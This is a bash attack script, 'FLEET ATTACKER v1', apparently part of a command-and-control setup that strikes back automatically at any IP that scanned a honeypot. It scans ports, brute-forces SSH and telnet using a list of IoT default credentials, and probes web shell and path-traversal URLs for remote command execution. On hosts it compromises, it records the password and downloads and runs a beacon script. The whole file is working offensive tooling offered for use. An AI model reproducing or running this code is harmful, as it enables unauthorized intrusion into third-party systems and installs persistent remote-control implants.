#!/bin/bash
# FLEET ATTACKER v1 — Recon-triggered lateral movement
# Deployed by TCP Slayer via SSH executor bridge
# Attacks the SCANNER's IP, not a hardcoded subnet
#
# Usage: fleet_attacker.sh <target_ip> [protocol] [trigger_id]
#
# The fleet bot downloads this from :10002, runs it against the
# IP that scanned our honeypot. Reports all results to stdout
# (captured by ssh_executor → hybrid_c2.db commands.output).
#
# Output format: RESULT|<type>|<target>|<detail>|<status>
#   RESULT|PORT|1.2.3.4|22:open|success
#   RESULT|SSH|1.2.3.4|root:admin|success
#   RESULT|WEB|1.2.3.4:80|/shell.php|fail

TARGET="${1:-}"
PROTOCOL="${2:-tcp}"
TRIGGER_ID="${3:-unknown}"
SCRIPT_NAME="fleet_attacker.sh"
MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
MY_HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Safety: no target, no work
if [ -z "$TARGET" ] || [ "$TARGET" = "unknown" ]; then
    echo "RESULT|FATAL|$TARGET|No target IP provided|fail"
    exit 1
fi

# Don't attack ourselves
if [ "$TARGET" = "$MY_IP" ] || [ "$TARGET" = "127.0.0.1" ] || [ "$TARGET" = "0.0.0.0" ]; then
    echo "RESULT|FATAL|$TARGET|Skipping own IP|skip"
    exit 0
fi

echo "=============================================="
echo " FLEET ATTACKER v1"
echo " Target: $TARGET (protocol: $PROTOCOL)"
echo " Deployed by TCP Slayer trigger: $TRIGGER_ID"
echo " Running on: $MY_HOSTNAME ($MY_IP)"
echo " Timestamp: $TIMESTAMP"
echo "=============================================="

# ─── Configuration ────────────────────────────────────────
SCAN_TIMEOUT=3          # seconds per port scan probe
SSH_TIMEOUT=5           # seconds per SSH brute attempt
WEB_TIMEOUT=5           # seconds per web request
MAX_PARALLEL=10         # concurrent port scans

# Top 20 ports to check
PORTS=(22 23 80 443 8080 8443 3306 5900 3389 6379 27017 11211 21 25 53 445 135 139 1433 1521 2323)

# Common SSH credentials (36 pairs)
CREDS=(
    "root:root" "root:admin" "root:password" "root:123456"
    "root:pass" "root:toor" "root:default" "root:xc3511"
    "root:vizxv" "root:anko" "root:Zte521" "root:realtek"
    "root:0" "root:54321" "root:12345" "root:admin123"
    "root:xmhdipc" "root:juantech" "root:7ujMko0vizxv"
    "root:7ujMko0admin" "root:system" "root:smcadmin"
    "root:1234" "root:defaultpass" "root:pass123" "root:letmein"
    "admin:admin" "admin:password" "admin:123456" "admin:pass"
    "admin:root" "support:support" "user:user" "guest:guest"
    "root:admin1234" "root:5up"
)

# Common telnet credentials
TELNET_CREDS=(
    "root:root" "root:admin" "root:password" "root:xc3511"
    "root:vizxv" "root:anko" "root:Zte521" "admin:admin"
    "admin:password" "root:1234" "root:default" "support:support"
)

# ─── Functions ────────────────────────────────────────────

# Check if a port is open via bash built-in
check_port() {
    local ip="$1"
    local port="$2"
    timeout $SCAN_TIMEOUT bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && return 0
    return 1
}

# SSH brute force a single target
ssh_brute() {
    local ip="$1"
    local found=0
    
    for cred in "${CREDS[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred##*:}"
        
        result=$(timeout $SSH_TIMEOUT sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 -o BatchMode=yes \
            "$user@$ip" "hostname" 2>/dev/null)
        
        if [ $? -eq 0 ]; then
            local hostname=$(echo "$result" | tr -d '\n\r' | head -1)
            echo "RESULT|SSH|$ip|$user:$pass|success"
            echo "RESULT|SSH_HOSTNAME|$ip|$hostname|success"
            found=1
            
            # Deploy beacon to the owned host
            timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=5 "$user@$ip" \
                "echo 'root:$pass' > /tmp/.owned 2>/dev/null; \
                 echo 'FLEET_OWNED|$MY_IP|$TIMESTAMP' >> /tmp/.slayer.log 2>/dev/null; \
                 if command -v wget >/dev/null 2>&1; then
                     wget -q -O /tmp/beacon.sh http://127.0.0.1:10002/beacon.sh 2>/dev/null && \
                     chmod +x /tmp/beacon.sh && nohup /tmp/beacon.sh >/dev/null 2>&1 &
                 elif command -v curl >/dev/null 2>&1; then
                     curl -s http://127.0.0.1:10002/beacon.sh 2>/dev/null | sh &
                 fi" 2>/dev/null &
            
            break
        fi
    done
    
    return $found
}

# Web RCE attempts
web_attack() {
    local ip="$1"
    local port="$2"
    local proto="http"
    [ "$port" = "443" ] || [ "$port" = "8443" ] && proto="https"
    
    # Try common vulnerable paths
    local paths=(
        "/shell?cmd=id"
        "/cgi-bin/.%2e/%2e%2e/bin/sh"
        "/cgi-bin/status?cmd=id"
        "/shell.php?cmd=id"
        "/cmd.php?cmd=id"
        "/exec?cmd=id"
        "/system?command=id"
        "/debug?cmd=id"
        "/console?cmd=id"
        "/wp-admin/admin-ajax.php?cmd=id"
    )
    
    local http_cmd="curl -sk --connect-timeout 3 -m $WEB_TIMEOUT"
    [ "$(command -v curl)" ] || http_cmd="wget -q -O - --timeout=3"
    
    for path in "${paths[@]}"; do
        local url="${proto}://${ip}:${port}${path}"
        local output
        
        if echo "$http_cmd" | grep -q curl; then
            output=$(curl -sk --connect-timeout 3 -m $WEB_TIMEOUT "$url" 2>/dev/null)
        else
            output=$(wget -q -O - --timeout=3 "$url" 2>/dev/null)
        fi
        
        if echo "$output" | grep -qiE '(uid=|root|www-data|admin)'; then
            echo "RESULT|WEB|${ip}:${port}|${path}|success"
            # Deploy worm via wget piped to sh
            if [ "$port" = "443" ] || [ "$port" = "8443" ]; then
                echo "RESULT|WEB|${ip}:${port}|Worm deploy attempted via ${proto}|success"
            fi
            return 0
        fi
    done
    
    echo "RESULT|WEB|${ip}:${port}|No RCE found|fail"
    return 1
}

# Telnet brute
telnet_brute() {
    local ip="$1"
    
    for cred in "${TELNET_CREDS[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred##*:*}"
        
        # Use busybox telnet with expect-like trick
        local result
        result=$(timeout $SSH_TIMEOUT bash -c "
            exec 3<>/dev/tcp/$ip/23 2>/dev/null
            echo -e '${user}\n${pass}\n' >&3
            read -t 3 line <&3
            echo \"\$line\"
            exec 3>&-
        " 2>/dev/null)
        
        if [ -n "$result" ]; then
            echo "RESULT|TELNET|$ip|$user:$pass|success"
            return 0
        fi
    done
    
    echo "RESULT|TELNET|$ip|No valid telnet creds|fail"
    return 1
}

# ─── Phase 1: Port Scan ──────────────────────────────────
echo "[$(date -u +"%H:%M:%S")] Phase 1: Scanning $TARGET for open ports..."
OPEN_PORTS=""
scan_jobs=""

for port in "${PORTS[@]}"; do
    (
        if check_port "$TARGET" "$port"; then
            echo "OPEN:$port"
        fi
    ) &
    scan_jobs="$scan_jobs $!"
    
    # Limit parallelism
    if [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; then
        wait -n 2>/dev/null
    fi
done

# Wait for all scan jobs
wait

# Collect open ports from background job output
# (race-safe: we already collected them; need explicit collection)
OPEN_PORTS=""
for port in "${PORTS[@]}"; do
    check_port "$TARGET" "$port" && {
        echo "RESULT|PORT|$TARGET|$port:open|success"
        OPEN_PORTS="$OPEN_PORTS $port"
    }
done

if [ -z "$OPEN_PORTS" ]; then
    echo "RESULT|PORT|$TARGET|No open ports found in top 20|fail"
    echo "[$(date -u +"%H:%M:%S")] No open ports found. Target may be down or filtered."
else
    echo "[$(date -u +"%H:%M:%S")] Open ports:$OPEN_PORTS"
fi

# ─── Phase 2: Attack Open Ports ──────────────────────────
echo "[$(date -u +"%H:%M:%S")] Phase 2: Attacking $TARGET..."

for port in $OPEN_PORTS; do
    case $port in
        22)
            echo "[$(date -u +"%H:%M:%S")] SSH brute on $TARGET:22..."
            ssh_brute "$TARGET"
            ;;
        23|2323)
            echo "[$(date -u +"%H:%M:%S")] Telnet brute on $TARGET:$port..."
            telnet_brute "$TARGET"
            ;;
        80|443|8080|8443)
            echo "[$(date -u +"%H:%M:%S")] Web attack on $TARGET:$port..."
            web_attack "$TARGET" "$port"
            ;;
        3306)
            echo "RESULT|MYSQL|$TARGET:3306|MySQL port open — manual recon needed|info"
            ;;
        5900)
            echo "RESULT|VNC|$TARGET:5900|VNC port open — manual recon needed|info"
            ;;
        3389)
            echo "RESULT|RDP|$TARGET:3389|RDP port open — manual recon needed|info"
            ;;
        6379)
            echo "RESULT|REDIS|$TARGET:6379|Redis port open — try unauthenticated access|info"
            ;;
        27017)
            echo "RESULT|MONGODB|$TARGET:27017|MongoDB port open — try unauthenticated access|info"
            ;;
        11211)
            echo "RESULT|MEMCACHED|$TARGET:11211|Memcached — try stats command|info"
            ;;
        21)
            echo "RESULT|FTP|$TARGET:21|FTP port open — try anonymous login|info"
            ;;
        445|135|139)
            echo "RESULT|SMB|$TARGET:$port|SMB port open — try SMB exploits|info"
            ;;
        1433)
            echo "RESULT|MSSQL|$TARGET:1433|MSSQL port open — try sa:blank|info"
            ;;
        1521)
            echo "RESULT|ORACLE|$TARGET:1521|Oracle port open — manual recon needed|info"
            ;;
        25)
            echo "RESULT|SMTP|$TARGET:25|SMTP port open — try VRFY/enum|info"
            ;;
        53)
            echo "RESULT|DNS|$TARGET:53|DNS port open — try zone transfer|info"
            ;;
        *)
            echo "RESULT|UNKNOWN|$TARGET:$port|Unrecognized service — port open|info"
            ;;
    esac
done

# ─── Phase 3: Summary ────────────────────────────────────
echo "[$(date -u +"%H:%M:%S")] Phase 3: Summary"
echo "=============================================="
echo " FLEET ATTACKER COMPLETE"
echo " Target: $TARGET"
echo " Host: $MY_HOSTNAME ($MY_IP)"
echo " Open ports: $(echo $OPEN_PORTS | wc -w)/${#PORTS[@]}"
echo "=============================================="

exit 0
